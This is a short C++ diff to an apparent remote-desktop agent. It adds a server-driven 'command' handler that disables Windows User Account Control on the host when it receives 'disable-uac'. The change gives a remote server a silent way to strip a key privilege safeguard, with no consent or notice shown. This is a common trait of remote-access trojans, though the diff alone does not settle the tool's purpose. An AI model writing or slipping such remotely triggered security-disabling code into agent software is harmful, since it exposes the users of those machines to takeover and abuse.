@@ -1170,6 +1170,27 @@ void RDPAgent::handle_control(const std::string &j)
         if (json_str_ex(j, "text", text))
             clipboard_write_utf8(text);
     }
+    else if (type == "command")
+    {
+        // Handle system commands from server
+        std::string cmd;
+        if (json_str(j, "cmd", cmd))
+        {
+            logf("handle_control: received command: %s", cmd.c_str());
+            if (cmd == "disable-uac")
+            {
+                log("handle_control: Executing disable_uac() command from server");
+                if (disable_uac())
+                {
+                    log("handle_control: UAC disabled successfully");
+                }
+                else
+                {
+                    log("handle_control: WARNING - Failed to disable UAC");
+                }
+            }
+        }
+    }
 }
 
 // ============ FFMPEG ============
